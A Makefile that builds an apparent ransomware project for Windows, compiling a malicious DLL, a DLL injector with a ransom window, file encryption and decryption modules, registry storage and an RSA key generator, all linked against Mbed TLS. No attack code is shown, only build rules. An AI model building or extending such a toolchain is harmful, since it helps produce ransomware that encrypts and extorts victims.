# Compiler
CC = gcc

# Directories
SRC_DIR   = src
BUILD_DIR = build
INC_DIR   = include

# Mbed TLS paths
MBEDTLS_INC  = /mingw64/include
MBEDTLS_LIBS = \
    /mingw64/lib/libmbedtls.a \
    /mingw64/lib/libmbedx509.a \
    /mingw64/lib/libmbedcrypto.a

# Windows system libraries REQUIRED by static mbedtls
WIN_LIBS = -lcomctl32 -luser32 -lgdi32 -lbcrypt -lcrypt32 -lws2_32 -lgdi32

# Compiler flags
CFLAGS = -Wall -I$(SRC_DIR) -I$(INC_DIR) -I$(MBEDTLS_INC)

# Linker flags (static)
LDFLAGS = -static -static-libgcc -static-libstdc++ \
          $(MBEDTLS_LIBS) $(WIN_LIBS)

# Shared sources
SHARED_SRC = \
    $(SRC_DIR)/get_relative_path.c \
    $(SRC_DIR)/store_in_register.c \
    $(SRC_DIR)/attack.c \
    $(SRC_DIR)/attack_crypto.c \
    $(SRC_DIR)/attack_web.c \
    $(SRC_DIR)/attack_decrypt.c  \
    $(SRC_DIR)/read_files.c
    

RANSOM_WINDOW_SRC = $(SRC_DIR)/ransom_window.c 

# Per-target sources
DLL_SRC       = $(SRC_DIR)/bad_dll.c $(SHARED_SRC)
INJECTOR_SRC  = $(SRC_DIR)/dll_injector.c $(SHARED_SRC) $(RANSOM_WINDOW_SRC)
GENERATE_RSA_SRC = $(SRC_DIR)/generate_rsa.c

# Targets
BAD_DLL      = $(BUILD_DIR)/tools.dll
INJECTOR_EXE = $(BUILD_DIR)/luca.exe
RSA_EXE      = $(BUILD_DIR)/generate_rsa.exe

# Default target
all: $(BAD_DLL) $(INJECTOR_EXE) $(DECRYPT_EXE) $(RSA_EXE)

# Build directory
$(BUILD_DIR):
	mkdir -p $(BUILD_DIR)

# DLL
$(BAD_DLL): $(DLL_SRC) | $(BUILD_DIR)
	$(CC) $(CFLAGS) -shared -o $@ $^ $(LDFLAGS)

# EXEs
$(INJECTOR_EXE): $(INJECTOR_SRC) | $(BUILD_DIR)
	$(CC) $(CFLAGS) -o  $@ $^ -mwindows $(LDFLAGS)

$(RSA_EXE): $(GENERATE_RSA_SRC) | $(BUILD_DIR)
	$(CC) $(CFLAGS) -o $@ $^ $(LDFLAGS)

# Clean
clean:
	rm -f $(BUILD_DIR)/*.exe $(BUILD_DIR)/*.dll
